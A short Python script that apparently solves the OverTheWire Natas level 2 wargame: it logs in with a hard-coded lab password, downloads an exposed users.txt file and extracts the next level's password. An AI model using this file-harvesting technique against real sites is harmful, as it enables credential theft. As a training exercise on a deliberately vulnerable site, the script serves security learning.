#!/usr/bin/env python

import requests
import re

username = 'natas2'
password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username

r = requests.get(url, auth=(username, password))

password = re.findall('natas3:(.*)', r.text)[0]

print(password)